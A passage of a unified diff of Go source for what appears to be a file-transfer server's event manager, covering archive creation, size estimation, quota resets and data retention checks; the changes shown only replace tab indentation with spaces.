path.Dir(p))\n+        }\n+        parentDirs = util.RemoveDuplicates(parentDirs, false)\n+        baseDir := \"/\"\n+        if len(parentDirs) == 1 {\n+                baseDir = parentDirs[0]\n+        }\n+        return baseDir\n }\n \n func getSizeForPath(conn *BaseConnection, p string, info os.FileInfo) (int64, error) {\n-\tif info.IsDir() {\n-\t\tvar dirSize int64\n-\t\tlister, err := conn.ListDir(p)\n-\t\tif err != nil {\n-\t\t\treturn 0, err\n-\t\t}\n-\t\tdefer lister.Close()\n-\t\tfor {\n-\t\t\tentries, err := lister.Next(vfs.ListerBatchSize)\n-\t\t\tfinished := errors.Is(err, io.EOF)\n-\t\t\tif err != nil && !finished {\n-\t\t\t\treturn 0, err\n-\t\t\t}\n-\t\t\tfor _, entry := range entries {\n-\t\t\t\tsize, err := getSizeForPath(conn, path.Join(p, entry.Name()), entry)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn 0, err\n-\t\t\t\t}\n-\t\t\t\tdirSize += size\n-\t\t\t}\n-\t\t\tif finished {\n-\t\t\t\treturn dirSize, nil\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif info.Mode().IsRegular() {\n-\t\treturn info.Size(), nil\n-\t}\n-\treturn 0, nil\n+        if info.IsDir() {\n+                var dirSize int64\n+                lister, err := conn.ListDir(p)\n+                if err != nil {\n+                        return 0, err\n+                }\n+                defer lister.Close()\n+                for {\n+                        entries, err := lister.Next(vfs.ListerBatchSize)\n+                        finished := errors.Is(err, io.EOF)\n+                        if err != nil && !finished {\n+                                return 0, err\n+                        }\n+                        for _, entry := range entries {\n+                                size, err := getSizeForPath(conn, path.Join(p, entry.Name()), entry)\n+                                if err != nil {\n+                                        return 0, err\n+                                }\n+                                dirSize += size\n+                        }\n+                        if finished {\n+                                return dirSize, nil\n+                        }\n+                }\n+        }\n+        if info.Mode().IsRegular() {\n+                return info.Size(), nil\n+        }\n+        return 0, nil\n }\n \n func estimateZipSize(conn *BaseConnection, zipPath string, paths []string) (int64, error) {\n-\tq, _ := conn.HasSpace(false, false, zipPath)\n-\tif q.HasSpace && q.GetRemainingSize() > 0 {\n-\t\tvar size int64\n-\t\tfor _, item := range paths {\n-\t\t\tinfo, err := conn.DoStat(item, 1, false)\n-\t\t\tif err != nil {\n-\t\t\t\treturn size, err\n-\t\t\t}\n-\t\t\titemSize, err := getSizeForPath(conn, item, info)\n-\t\t\tif err != nil {\n-\t\t\t\treturn size, err\n-\t\t\t}\n-\t\t\tsize += itemSize\n-\t\t}\n-\t\teventManagerLog(logger.LevelDebug, \"archive paths %v, archive name %q, size: %d\", paths, zipPath, size)\n-\t\t// we assume the zip size will be half of the real size\n-\t\treturn size / 2, nil\n-\t}\n-\treturn -1, nil\n+        q, _ := conn.HasSpace(false, false, zipPath)\n+        if q.HasSpace && q.GetRemainingSize() > 0 {\n+                var size int64\n+                for _, item := range paths {\n+                        info, err := conn.DoStat(item, 1, false)\n+                        if err != nil {\n+                                return size, err\n+                        }\n+                        itemSize, err := getSizeForPath(conn, item, info)\n+                        if err != nil {\n+                                return size, err\n+                        }\n+                        size += itemSize\n+                }\n+                eventManagerLog(logger.LevelDebug, \"archive paths %v, archive name %q, size: %d\", paths, zipPath, size)\n+                // we assume the zip size will be half of the real size\n+                return size / 2, nil\n+        }\n+        return -1, nil\n }\n \n func executeCompressFsActionForUser(c dataprovider.EventActionFsCompress, replacer *strings.Replacer,\n-\tuser dataprovider.User,\n+        user dataprovider.User,\n ) error {\n-\tuser, err := getUserForEventAction(user)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tconnectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n-\terr = user.CheckFsRoot(connectionID)\n-\tdefer user.CloseFs() //nolint:errcheck\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"compress error, unable to check root fs for user %q: %w\", user.Username, err)\n-\t}\n-\tconn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n-\tname := util.CleanPath(replaceWithReplacer(c.Name, replacer))\n-\tconn.CheckParentDirs(path.Dir(name)) //nolint:errcheck\n-\tpaths := make([]string, 0, len(c.Paths))\n-\tfor idx := range c.Paths {\n-\t\tp := util.CleanPath(replaceWithReplacer(c.Paths[idx], replacer))\n-\t\tif p == name {\n-\t\t\treturn fmt.Errorf(\"cannot compress the archive to create: %q\", name)\n-\t\t}\n-\t\tpaths = append(paths, p)\n-\t}\n-\tpaths = util.RemoveDuplicates(paths, false)\n-\testimatedSize, err := estimateZipSize(conn, name, paths)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to estimate size for archive %q: %v\", name, err)\n-\t\treturn fmt.Errorf(\"unable to estimate archive size: %w\", err)\n-\t}\n-\twriter, numFiles, truncatedSize, cancelFn, err := getFileWriter(conn, name, estimatedSize)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to create archive %q: %v\", name, err)\n-\t\treturn fmt.Errorf(\"unable to create archive: %w\", err)\n-\t}\n-\tdefer cancelFn()\n-\n-\tbaseDir := getArchiveBaseDir(paths)\n-\teventManagerLog(logger.LevelDebug, \"creating archive %q for paths %+v\", name, paths)\n-\n-\tzipWriter := &zipWriterWrapper{\n-\t\tName:    name,\n-\t\tWriter:  zip.NewWriter(writer),\n-\t\tEntries: make(map[string]bool),\n-\t}\n-\tstartTime := time.Now()\n-\tfor _, item := range paths {\n-\t\tif err := addZipEntry(zipWriter, conn, item, baseDir, 0); err != nil {\n-\t\t\tcloseWriterAndUpdateQuota(writer, conn, name, \"\", numFiles, truncatedSize, err, operationUpload, startTime) //nolint:errcheck\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\tif err := zipWriter.Writer.Close(); err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to close zip file %q: %v\", name, err)\n-\t\tcloseWriterAndUpdateQuota(writer, conn, name, \"\", numFiles, truncatedSize, err, operationUpload, startTime) //nolint:errcheck\n-\t\treturn fmt.Errorf(\"unable to close zip file %q: %w\", name, err)\n-\t}\n-\treturn closeWriterAndUpdateQuota(writer, conn, name, \"\", numFiles, truncatedSize, err, operationUpload, startTime)\n+        user, err := getUserForEventAction(user)\n+        if err != nil {\n+                return err\n+        }\n+        connectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n+        err = user.CheckFsRoot(connectionID)\n+        defer user.CloseFs() //nolint:errcheck\n+        if err != nil {\n+                return fmt.Errorf(\"compress error, unable to check root fs for user %q: %w\", user.Username, err)\n+        }\n+        conn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n+        name := util.CleanPath(replaceWithReplacer(c.Name, replacer))\n+        conn.CheckParentDirs(path.Dir(name)) //nolint:errcheck\n+        paths := make([]string, 0, len(c.Paths))\n+        for idx := range c.Paths {\n+                p := util.CleanPath(replaceWithReplacer(c.Paths[idx], replacer))\n+                if p == name {\n+                        return fmt.Errorf(\"cannot compress the archive to create: %q\", name)\n+                }\n+                paths = append(paths, p)\n+        }\n+        paths = util.RemoveDuplicates(paths, false)\n+        estimatedSize, err := estimateZipSize(conn, name, paths)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to estimate size for archive %q: %v\", name, err)\n+                return fmt.Errorf(\"unable to estimate archive size: %w\", err)\n+        }\n+        writer, numFiles, truncatedSize, cancelFn, err := getFileWriter(conn, name, estimatedSize)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to create archive %q: %v\", name, err)\n+                return fmt.Errorf(\"unable to create archive: %w\", err)\n+        }\n+        defer cancelFn()\n+\n+        baseDir := getArchiveBaseDir(paths)\n+        eventManagerLog(logger.LevelDebug, \"creating archive %q for paths %+v\", name, paths)\n+\n+        zipWriter := &zipWriterWrapper{\n+                Name:    name,\n+                Writer:  zip.NewWriter(writer),\n+                Entries: make(map[string]bool),\n+        }\n+        startTime := time.Now()\n+        for _, item := range paths {\n+                if err := addZipEntry(zipWriter, conn, item, baseDir, 0); err != nil {\n+                        closeWriterAndUpdateQuota(writer, conn, name, \"\", numFiles, truncatedSize, err, operationUpload, startTime) //nolint:errcheck\n+                        return err\n+                }\n+        }\n+        if err := zipWriter.Writer.Close(); err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to close zip file %q: %v\", name, err)\n+                closeWriterAndUpdateQuota(writer, conn, name, \"\", numFiles, truncatedSize, err, operationUpload, startTime) //nolint:errcheck\n+                return fmt.Errorf(\"unable to close zip file %q: %w\", name, err)\n+        }\n+        return closeWriterAndUpdateQuota(writer, conn, name, \"\", numFiles, truncatedSize, err, operationUpload, startTime)\n }\n \n func executeExistFsRuleAction(exist []string, replacer *strings.Replacer, conditions dataprovider.ConditionOptions,\n-\tparams *EventParams,\n+        params *EventParams,\n ) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping fs exist for user %s, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif err = executeExistFsActionForUser(exist, replacer, user); err != nil {\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t\tparams.AddError(err)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"fs existence check failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no existence check executed\")\n-\t\treturn errors.New(\"no existence check executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping fs exist for user %s, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if err = executeExistFsActionForUser(exist, replacer, user); err != nil {\n+                        failures = append(failures, user.Username)\n+                        params.AddError(err)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"fs existence check failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no existence check executed\")\n+                return errors.New(\"no existence check executed\")\n+        }\n+        return nil\n }\n \n func executeCompressFsRuleAction(c dataprovider.EventActionFsCompress, replacer *strings.Replacer,\n-\tconditions dataprovider.ConditionOptions, params *EventParams,\n+        conditions dataprovider.ConditionOptions, params *EventParams,\n ) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping fs compress for user %s, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif err = executeCompressFsActionForUser(c, replacer, user); err != nil {\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t\tparams.AddError(err)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"fs compress failed for users: %s\", strings.Join(failures, \",\"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no file/folder compressed\")\n-\t\treturn errors.New(\"no file/folder compressed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping fs compress for user %s, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if err = executeCompressFsActionForUser(c, replacer, user); err != nil {\n+                        failures = append(failures, user.Username)\n+                        params.AddError(err)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"fs compress failed for users: %s\", strings.Join(failures, \",\"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no file/folder compressed\")\n+                return errors.New(\"no file/folder compressed\")\n+        }\n+        return nil\n }\n \n func executeFsRuleAction(c dataprovider.EventActionFilesystemConfig, conditions dataprovider.ConditionOptions,\n-\tparams *EventParams,\n+        params *EventParams,\n ) error {\n-\taddObjectData := false\n-\treplacements := params.getStringReplacements(addObjectData, false)\n-\treplacer := strings.NewReplacer(replacements...)\n-\tswitch c.Type {\n-\tcase dataprovider.FilesystemActionRename:\n-\t\treturn executeRenameFsRuleAction(c.Renames, replacer, conditions, params)\n-\tcase dataprovider.FilesystemActionDelete:\n-\t\treturn executeDeleteFsRuleAction(c.Deletes, replacer, conditions, params)\n-\tcase dataprovider.FilesystemActionMkdirs:\n-\t\treturn executeMkdirFsRuleAction(c.MkDirs, replacer, conditions, params)\n-\tcase dataprovider.FilesystemActionExist:\n-\t\treturn executeExistFsRuleAction(c.Exist, replacer, conditions, params)\n-\tcase dataprovider.FilesystemActionCompress:\n-\t\treturn executeCompressFsRuleAction(c.Compress, replacer, conditions, params)\n-\tcase dataprovider.FilesystemActionCopy:\n-\t\treturn executeCopyFsRuleAction(c.Copy, replacer, conditions, params)\n-\tdefault:\n-\t\treturn fmt.Errorf(\"unsupported filesystem action %d\", c.Type)\n-\t}\n+        addObjectData := false\n+        replacements := params.getStringReplacements(addObjectData, false)\n+        replacer := strings.NewReplacer(replacements...)\n+        switch c.Type {\n+        case dataprovider.FilesystemActionRename:\n+                return executeRenameFsRuleAction(c.Renames, replacer, conditions, params)\n+        case dataprovider.FilesystemActionDelete:\n+                return executeDeleteFsRuleAction(c.Deletes, replacer, conditions, params)\n+        case dataprovider.FilesystemActionMkdirs:\n+                return executeMkdirFsRuleAction(c.MkDirs, replacer, conditions, params)\n+        case dataprovider.FilesystemActionExist:\n+                return executeExistFsRuleAction(c.Exist, replacer, conditions, params)\n+        case dataprovider.FilesystemActionCompress:\n+                return executeCompressFsRuleAction(c.Compress, replacer, conditions, params)\n+        case dataprovider.FilesystemActionCopy:\n+                return executeCopyFsRuleAction(c.Copy, replacer, conditions, params)\n+        default:\n+                return fmt.Errorf(\"unsupported filesystem action %d\", c.Type)\n+        }\n }\n \n func executeQuotaResetForUser(user *dataprovider.User) error {\n-\tif err := user.LoadAndApplyGroupSettings(); err != nil {\n-\t\teventManagerLog(logger.LevelError, \"skipping scheduled quota reset for user %s, cannot apply group settings: %v\",\n-\t\t\tuser.Username, err)\n-\t\treturn err\n-\t}\n-\tif !QuotaScans.AddUserQuotaScan(user.Username, user.Role) {\n-\t\teventManagerLog(logger.LevelError, \"another quota scan is already in progress for user %q\", user.Username)\n-\t\treturn fmt.Errorf(\"another quota scan is in progress for user %q\", user.Username)\n-\t}\n-\tdefer QuotaScans.RemoveUserQuotaScan(user.Username)\n-\n-\tnumFiles, size, err := user.ScanQuota()\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"error scanning quota for user %q: %v\", user.Username, err)\n-\t\treturn fmt.Errorf(\"error scanning quota for user %q: %w\", user.Username, err)\n-\t}\n-\terr = dataprovider.UpdateUserQuota(user, numFiles, size, true)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"error updating quota for user %q: %v\", user.Username, err)\n-\t\treturn fmt.Errorf(\"error updating quota for user %q: %w\", user.Username, err)\n-\t}\n-\treturn nil\n+        if err := user.LoadAndApplyGroupSettings(); err != nil {\n+                eventManagerLog(logger.LevelError, \"skipping scheduled quota reset for user %s, cannot apply group settings: %v\",\n+                        user.Username, err)\n+                return err\n+        }\n+        if !QuotaScans.AddUserQuotaScan(user.Username, user.Role) {\n+                eventManagerLog(logger.LevelError, \"another quota scan is already in progress for user %q\", user.Username)\n+                return fmt.Errorf(\"another quota scan is in progress for user %q\", user.Username)\n+        }\n+        defer QuotaScans.RemoveUserQuotaScan(user.Username)\n+\n+        numFiles, size, err := user.ScanQuota()\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"error scanning quota for user %q: %v\", user.Username, err)\n+                return fmt.Errorf(\"error scanning quota for user %q: %w\", user.Username, err)\n+        }\n+        err = dataprovider.UpdateUserQuota(user, numFiles, size, true)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"error updating quota for user %q: %v\", user.Username, err)\n+                return fmt.Errorf(\"error updating quota for user %q: %w\", user.Username, err)\n+        }\n+        return nil\n }\n \n func executeUsersQuotaResetRuleAction(conditions dataprovider.ConditionOptions, params *EventParams) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping quota reset for user %q, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif err = executeQuotaResetForUser(&user); err != nil {\n-\t\t\tparams.AddError(err)\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"quota reset failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no user quota reset executed\")\n-\t\treturn errors.New(\"no user quota reset executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping quota reset for user %q, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if err = executeQuotaResetForUser(&user); err != nil {\n+                        params.AddError(err)\n+                        failures = append(failures, user.Username)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"quota reset failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no user quota reset executed\")\n+                return errors.New(\"no user quota reset executed\")\n+        }\n+        return nil\n }\n \n func executeFoldersQuotaResetRuleAction(conditions dataprovider.ConditionOptions, params *EventParams) error {\n-\tfolders, err := params.getFolders()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get folders: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, folder := range folders {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" && !checkEventConditionPatterns(folder.Name, conditions.Names) {\n-\t\t\teventManagerLog(logger.LevelDebug, \"skipping scheduled quota reset for folder %s, name conditions don't match\",\n-\t\t\t\tfolder.Name)\n-\t\t\tcontinue\n-\t\t}\n-\t\tif !QuotaScans.AddVFolderQuotaScan(folder.Name) {\n-\t\t\teventManagerLog(logger.LevelError, \"another quota scan is already in progress for folder %q\", folder.Name)\n-\t\t\tparams.AddError(fmt.Errorf(\"another quota scan is already in progress for folder %q\", folder.Name))\n-\t\t\tfailures = append(failures, folder.Name)\n-\t\t\tcontinue\n-\t\t}\n-\t\texecuted++\n-\t\tf := vfs.VirtualFolder{\n-\t\t\tBaseVirtualFolder: folder,\n-\t\t\tVirtualPath:       \"/\",\n-\t\t}\n-\t\tnumFiles, size, err := f.ScanQuota()\n-\t\tQuotaScans.RemoveVFolderQuotaScan(folder.Name)\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelError, \"error scanning quota for folder %q: %v\", folder.Name, err)\n-\t\t\tparams.AddError(fmt.Errorf(\"error scanning quota for folder %q: %w\", folder.Name, err))\n-\t\t\tfailures = append(failures, folder.Name)\n-\t\t\tcontinue\n-\t\t}\n-\t\terr = dataprovider.UpdateVirtualFolderQuota(&folder, numFiles, size, true)\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelError, \"error updating quota for folder %q: %v\", folder.Name, err)\n-\t\t\tparams.AddError(fmt.Errorf(\"error updating quota for folder %q: %w\", folder.Name, err))\n-\t\t\tfailures = append(failures, folder.Name)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"quota reset failed for folders: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no folder quota reset executed\")\n-\t\treturn errors.New(\"no folder quota reset executed\")\n-\t}\n-\treturn nil\n+        folders, err := params.getFolders()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get folders: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, folder := range folders {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" && !checkEventConditionPatterns(folder.Name, conditions.Names) {\n+                        eventManagerLog(logger.LevelDebug, \"skipping scheduled quota reset for folder %s, name conditions don't match\",\n+                                folder.Name)\n+                        continue\n+                }\n+                if !QuotaScans.AddVFolderQuotaScan(folder.Name) {\n+                        eventManagerLog(logger.LevelError, \"another quota scan is already in progress for folder %q\", folder.Name)\n+                        params.AddError(fmt.Errorf(\"another quota scan is already in progress for folder %q\", folder.Name))\n+                        failures = append(failures, folder.Name)\n+                        continue\n+                }\n+                executed++\n+                f := vfs.VirtualFolder{\n+                        BaseVirtualFolder: folder,\n+                        VirtualPath:       \"/\",\n+                }\n+                numFiles, size, err := f.ScanQuota()\n+                QuotaScans.RemoveVFolderQuotaScan(folder.Name)\n+                if err != nil {\n+                        eventManagerLog(logger.LevelError, \"error scanning quota for folder %q: %v\", folder.Name, err)\n+                        params.AddError(fmt.Errorf(\"error scanning quota for folder %q: %w\", folder.Name, err))\n+                        failures = append(failures, folder.Name)\n+                        continue\n+                }\n+                err = dataprovider.UpdateVirtualFolderQuota(&folder, numFiles, size, true)\n+                if err != nil {\n+                        eventManagerLog(logger.LevelError, \"error updating quota for folder %q: %v\", folder.Name, err)\n+                        params.AddError(fmt.Errorf(\"error updating quota for folder %q: %w\", folder.Name, err))\n+                        failures = append(failures, folder.Name)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"quota reset failed for folders: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no folder quota reset executed\")\n+                return errors.New(\"no folder quota reset executed\")\n+        }\n+        return nil\n }\n \n func executeTransferQuotaResetRuleAction(conditions dataprovider.ConditionOptions, params *EventParams) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping scheduled transfer quota reset for user %s, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\terr = dataprovider.UpdateUserTransferQuota(&user, 0, 0, true)\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelError, \"error updating transfer quota for user %q: %v\", user.Username, err)\n-\t\t\tparams.AddError(fmt.Errorf(\"error updating transfer quota for user %q: %w\", user.Username, err))\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"transfer quota reset failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no transfer quota reset executed\")\n-\t\treturn errors.New(\"no transfer quota reset executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping scheduled transfer quota reset for user %s, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                err = dataprovider.UpdateUserTransferQuota(&user, 0, 0, true)\n+                if err != nil {\n+                        eventManagerLog(logger.LevelError, \"error updating transfer quota for user %q: %v\", user.Username, err)\n+                        params.AddError(fmt.Errorf(\"error updating transfer quota for user %q: %w\", user.Username, err))\n+                        failures = append(failures, user.Username)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"transfer quota reset failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no transfer quota reset executed\")\n+                return errors.New(\"no transfer quota reset executed\")\n+        }\n+        return nil\n }\n \n func executeDataRetentionCheckForUser(user dataprovider.User, folders []dataprovider.FolderRetention,\n-\tparams *EventParams, actionName string,\n+        params *EventParams, actionName string,\n ) error {\n-\tif err := user.LoadAndApplyGroupSettings(); err != nil {\n-\t\teventManagerLog(logger.LevelError, \"skipping scheduled retention check for user %s, cannot apply group settings: %v\",\n-\t\t\tuser.Username, err)\n-\t\treturn err\n-\t}\n-\tcheck := RetentionCheck{\n-\t\tFolders: folders,\n-\t}\n-\tc := RetentionChecks.Add(check, &user)\n-\tif c == nil {\n-\t\teventManagerLog(logger.LevelError, \"another retention check is already in progress for user %q\", user.Username)\n-\t\treturn fmt.Errorf(\"another retention check is in progress for user %q\", user.Username)\n-\t}\n-\tdefer func() {\n-\t\tparams.retentionChecks = append(params.retentionChecks, executedRetentionCheck{\n-\t\t\tUsername:   user.Username,\n-\t\t\tActionName: actionName,\n-\t\t\tResults:    c.results,\n-\t\t})\n-\t}()\n-\tif err := c.Start(); err != nil {\n-\t\teventManagerLog(logger.LevelError, \"error checking retention for user %q: %v\", user.Username, err)\n-\t\treturn fmt.Errorf(\"error checking retention for user %q: %w\", user.Username, err)\n-\t}\n-\treturn nil\n+        if err := user.LoadAndApplyGroupSettings(); err != nil {\n+                eventManagerLog(logger.LevelError, \"skipping scheduled retention check for user %s, cannot apply group settings: %v\",\n+                        user.Username, err)\n+                return err\n+        }\n+        check := RetentionCheck{\n+                Folders: folders,\n+        }\n+        c := RetentionChecks.Add(check, &user)\n+        if c == nil {\n+                eventManagerLog(logger.LevelError, \"another retention check is already in progress for user %q\", user.Username)\n+                return fmt.Errorf(\"another retention check is in progress for user %q\", user.Username)\n+        }\n+        defer func() {\n+                params.retentionChecks = append(params.retentionChecks, executedRetentionCheck{\n+                        Username:   user.Username,\n+                        ActionName: actionName,\n+                        Results:    c.results,\n+                })\n+        }()\n+        if err := c.Start(); err != nil {\n+                eventManagerLog(logger.LevelError, \"error checking retention for user %q: %v\", user.Username, err)\n+                return fmt.Errorf(\"error checking retention for user %q: %w\", user.Username, err)\n+        }\n+        return nil\n }\n \n func executeDataRetentionCheckRuleAction(config dataprovider.EventActionDataRetentionConfig,\n-\tconditions dataprovider.ConditionOptions, params *EventParams, actionName string,\n+        conditions dataprovider.ConditionOptions, params *EventParams, actionName string,\n ) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping scheduled retention check for user %s, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif err = executeDataRetentionCheckForUser(user, config.Folders, params, actionName); err != nil {\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t\tparams.AddError(err)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"retention check failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no retention check executed\")\n-\t\treturn errors.New(\"no retention check executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping scheduled retention check for user %s, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if err = 